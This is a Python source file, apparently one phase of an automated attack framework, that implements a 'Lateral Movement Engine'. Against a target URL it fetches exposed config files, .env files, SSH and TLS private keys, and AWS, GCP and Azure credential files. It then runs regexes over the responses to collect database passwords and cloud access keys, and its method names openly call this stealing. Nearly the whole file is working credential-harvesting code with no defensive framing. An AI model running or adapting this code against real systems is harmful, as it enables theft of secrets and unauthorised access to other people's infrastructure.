"""
Lateral Movement Engine
Phase 4: Pivot from initial breach to other systems, extract credentials
"""

import asyncio
import aiohttp
import logging
from typing import Dict, List, Any, Optional
from .base import LateralMovementModule
import re

logger = logging.getLogger(__name__)


class LateralMovementEngine(LateralMovementModule):
    """
    Lateral movement and privilege escalation
    - Credential extraction from code/config
    - Service discovery (internal networks)
    - Database credential harvesting
    - SSH key extraction
    - Cloud provider credential theft (AWS, GCP, Azure)
    """

    def __init__(self):
        super().__init__(
            name="Lateral Movement Engine",
            description="Pivot to other systems and extract credentials"
        )
        self.discovered_services: List[str] = []
        self.extracted_credentials: List[Dict[str, Any]] = []

    async def execute(self, context) -> Dict[str, Any]:
        """Execute lateral movement attacks using persistence results"""
        logger.info(f"[Lateral] Starting lateral movement on {context.target_url}")

        # Only attempt if persistence was achieved
        if not context.persistence_achieved:
            logger.info(f"  ✗ Skipping lateral movement - no persistence")
            return {"services_discovered": [], "credentials_extracted": 0, "methods": []}

        results = await asyncio.gather(
            self._extract_database_credentials(context.target_url),
            self._discover_internal_services(context.target_url),
            self._harvest_ssh_keys(context.target_url),
            self._steal_cloud_credentials(context.target_url),
        )

        # Update context with lateral movement results
        context.discovered_services.extend(self.discovered_services)
        context.extracted_credentials.extend(self.extracted_credentials)
        context.ssh_keys_found = [c.get("path", "") for c in self.extracted_credentials if c.get("type") in ["ssh_key", "cert"]]

        return {
            "services_discovered": self.discovered_services,
            "credentials_extracted": len(self.extracted_credentials),
            "methods": [r.get("method") for r in results if r.get("success")]
        }

    async def _extract_database_credentials(self, target: str) -> Dict[str, Any]:
        """Extract database credentials from environment/config"""
        logger.info(f"[Lateral] Extracting database credentials")

        # Common database credential patterns
        credential_endpoints = [
            "/.env",
            "/config/database.yml",
            "/src/config.ts",
            "/app/settings.py",
            "/config.json",
            "/docker-compose.yml"
        ]

        patterns = {
            "DATABASE_URL": r"(postgres|mysql|mongodb)://([^:]+):([^@]+)@([^/]+)/(\S+)",
            "AWS": r"aws_access_key_id\s*=\s*([A-Z0-9]+)",
            "MONGODB": r"mongodb(\+srv)?://([^:]+):([^@]+)@",
            "REDIS": r"redis://([^:]+):([^/]+)@([^/]+):(\d+)",
        }

        async with aiohttp.ClientSession() as session:
            for endpoint in credential_endpoints:
                try:
                    url = f"{target}{endpoint}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        if resp.status == 200:
                            content = await resp.text()

                            # Search for credentials
                            for cred_type, pattern in patterns.items():
                                matches = re.findall(pattern, content)
                                for match in matches:
                                    logger.info(f"  ✓ Found {cred_type} credentials")
                                    self.extracted_credentials.append({
                                        "type": cred_type,
                                        "endpoint": endpoint,
                                        "credential": str(match)[:50] + "..."
                                    })

                except Exception as e:
                    pass

        if self.extracted_credentials:
            logger.info(f"  ✓ Extracted {len(self.extracted_credentials)} database credentials")
            return {"success": True, "method": "db_credential_extraction"}

        return {"success": False, "method": "db_credential_extraction"}

    async def _discover_internal_services(self, target: str) -> Dict[str, Any]:
        """Discover internal services and microservices"""
        logger.info(f"[Lateral] Discovering internal services")

        # Common internal service endpoints
        internal_endpoints = [
            "/api/v1/services",
            "/api/v1/health",
            "/api/v1/config",
            "/.well-known/service-mesh",
            "/actuator",  # Spring Boot
            "/health",
            "/metrics",
            "/trace"
        ]

        async with aiohttp.ClientSession() as session:
            for endpoint in internal_endpoints:
                try:
                    url = f"{target}{endpoint}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        if resp.status == 200:
                            data = await resp.json()

                            # Extract service names
                            if isinstance(data, dict):
                                services = data.get("services", [])
                                if services:
                                    self.discovered_services.extend(services)
                                    logger.info(f"  ✓ Found services at {endpoint}: {services}")

                except Exception as e:
                    pass

        if self.discovered_services:
            logger.info(f"  ✓ Discovered {len(self.discovered_services)} internal services")
            return {"success": True, "method": "service_discovery"}

        return {"success": False, "method": "service_discovery"}

    async def _harvest_ssh_keys(self, target: str) -> Dict[str, Any]:
        """Attempt to extract SSH keys and private certificates"""
        logger.info(f"[Lateral] Harvesting SSH keys")

        ssh_key_paths = [
            "/.ssh/id_rsa",
            "/.ssh/id_ed25519",
            "/.ssh/authorized_keys",
            "/.ssh/config",
            "/root/.ssh/id_rsa",
            "/home/*/.ssh/id_rsa",
            "/opt/app/.ssh/id_rsa",
        ]

        cert_paths = [
            "/etc/ssl/certs/private.key",
            "/etc/ssl/private/server.key",
            "/app/certs/tls.key",
            "/.config/certs/client.key"
        ]

        all_paths = ssh_key_paths + cert_paths

        async with aiohttp.ClientSession() as session:
            for path in all_paths:
                try:
                    url = f"{target}{path}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            if "BEGIN" in content and ("RSA" in content or "PRIVATE" in content):
                                logger.info(f"  ✓ Found SSH/Certificate key: {path}")
                                self.extracted_credentials.append({
                                    "type": "ssh_key" if "ssh" in path else "cert",
                                    "path": path,
                                    "preview": content[:50] + "..."
                                })

                except Exception as e:
                    pass

        if any(c["type"] in ["ssh_key", "cert"] for c in self.extracted_credentials):
            return {"success": True, "method": "ssh_key_extraction"}

        return {"success": False, "method": "ssh_key_extraction"}

    async def _steal_cloud_credentials(self, target: str) -> Dict[str, Any]:
        """Attempt to extract cloud provider credentials (AWS, GCP, Azure)"""
        logger.info(f"[Lateral] Stealing cloud provider credentials")

        cloud_endpoints = [
            "/api/v1/cloud/credentials",
            "/.aws/credentials",
            "/gcp-key.json",
            "/.azure/credentials",
            "/config/cloud-config.yml"
        ]

        cloud_patterns = {
            "AWS_ACCESS_KEY": r"AKIA[0-9A-Z]{16}",
            "AWS_SECRET": r"aws_secret_access_key\s*=\s*([A-Za-z0-9/+=]{40})",
            "GCP_KEY": r'"type": "service_account"',
            "AZURE_SECRET": "client_secret[\"\\s:]*=?\\s*[\"']([^\"']+)",
        }

        async with aiohttp.ClientSession() as session:
            for endpoint in cloud_endpoints:
                try:
                    url = f"{target}{endpoint}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        if resp.status == 200:
                            content = await resp.text()

                            for provider, pattern in cloud_patterns.items():
                                matches = re.findall(pattern, content)
                                for match in matches:
                                    logger.info(f"  ✓ Found {provider} credential")
                                    self.extracted_credentials.append({
                                        "type": provider,
                                        "endpoint": endpoint,
                                        "value": str(match)[:40] + "..."
                                    })

                except Exception as e:
                    pass

        if any(c["type"].startswith("AWS") or c["type"] in ["GCP_KEY", "AZURE_SECRET"]
               for c in self.extracted_credentials):
            return {"success": True, "method": "cloud_credential_theft"}

        return {"success": False, "method": "cloud_credential_theft"}

    async def analyze_defense(self, response: Dict) -> Optional[str]:
        """Detect lateral movement detection"""
        if response.get("status") == 403:
            return "ACCESS_DENIED"
        elif response.get("status") == 404:
            return "ENDPOINT_NOT_FOUND"
        elif "secret" in response.get("body", "").lower():
            return "SECRETS_DETECTION"
        elif "credential" in response.get("body", "").lower():
            return "CREDENTIAL_DETECTION"
        return None
